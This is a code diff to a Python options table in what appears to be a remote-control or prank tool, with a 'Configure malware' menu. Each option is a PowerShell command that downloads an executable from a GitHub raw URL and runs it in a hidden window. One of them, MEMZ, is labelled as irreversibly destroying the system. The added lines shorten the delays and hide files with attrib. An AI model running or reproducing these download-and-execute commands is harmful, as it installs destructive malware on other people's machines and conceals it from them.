@@ -26,16 +26,16 @@ GLOBAL_OPTIONS = { # Create the structure for all user options and commands
     
     "Configure malware": {
         "Salinewin.exe": {
-            "Install (non-destructive, purely effects)": "cd c:/System; Start-Sleep -Seconds 3; Remove-Item 'C:\\System\\saline.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/salinewin1.5-safety.exe' -OutFile 'C:\\System\\saline.exe'; Start-Process 'C:\\System\\saline.exe' -WindowStyle hidden",
-            "Stop": "Get-Process 'saline' | Stop-Process -Force"
+            "Install (non-destructive, purely effects)": "cd c:/System; Start-Sleep -Seconds 1; Remove-Item 'C:\\System\\saline.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/salinewin1.5-safety.exe' -OutFile 'C:\\System\\saline.exe'; Start-Process 'C:\\System\\saline.exe' -WindowStyle hidden; Start-Sleep -Seconds 5; attrib +h .; attrib +h",
+            "Stop": "Get-Process 'saline' | Stop-Process -Force; Start-Sleep -Seconds 2; Remove-Item 'C:\\System\\saline.exe' -Force"
         },
         "Memz.exe": {
-            "Install \u001b[31m(irreversibly destroys system)\u001b[90m": "cd c:/System; Start-Sleep -Seconds 3; Remove-Item 'C:\\System\\mz.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/memz.exe' -OutFile 'C:\\System\\mz.exe'; Start-Process 'C:\\System\\mz.exe' -WindowStyle hidden",
-            "Stop": "Get-Process 'memz' | Stop-Process -Force"
+            "Install \u001b[31m(irreversibly destroys system)\u001b[90m": "cd c:/System; Start-Sleep -Seconds 1; Remove-Item 'C:\\System\\mz.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/memz.exe' -OutFile 'C:\\System\\mz.exe'; Start-Process 'C:\\System\\mz.exe' -WindowStyle hidden; Start-Sleep -Seconds 1; Get-Process 'mz' | Stop-Process -Force; Start-Sleep -Seconds 5; attrib +h .; attrib +h",
+            "Stop": "Get-Process 'memz' | Stop-Process -Force; Start-Sleep -Seconds 2; Remove-Item 'C:\\System\\mz.exe' -Force"
         },
         "ButterflyOnDesktop.exe": {
-            "Install (non-destructive, but closed source)": "cd c:/System; if(Test-Path 'C:\\System\\bfly.exe'){for($i=0;$i -lt 5;$i++){Start-Process 'C:\\System\\bfly.exe'}}else{Start-Sleep -Seconds 3; Remove-Item 'C:\\System\\bfly.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/bod.exe' -OutFile 'C:\\System\\bfly.exe'; Start-Process 'C:\\System\\bfly.exe' -WindowStyle hidden}",
-            "Stop": "Get-Process 'bfly' | Stop-Process -Force"
+            "Install (non-destructive, but closed source)": "cd c:/System; if(Test-Path 'C:\\System\\bfly.exe'){for($i=0;$i -lt 5;$i++){Start-Process 'C:\\System\\bfly.exe'}}else{Start-Sleep -Seconds 1; Remove-Item 'C:\\System\\bfly.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/bod.exe' -OutFile 'C:\\System\\bfly.exe'; Start-Process 'C:\\System\\bfly.exe' -WindowStyle hidden}; attrib +h .; attrib +h",
+            "Stop": "Get-Process 'bfly' | Stop-Process -Force; Start-Sleep -Seconds 2; Remove-Item 'C:\\System\\bfly.exe' -Force"
         }
     },
 
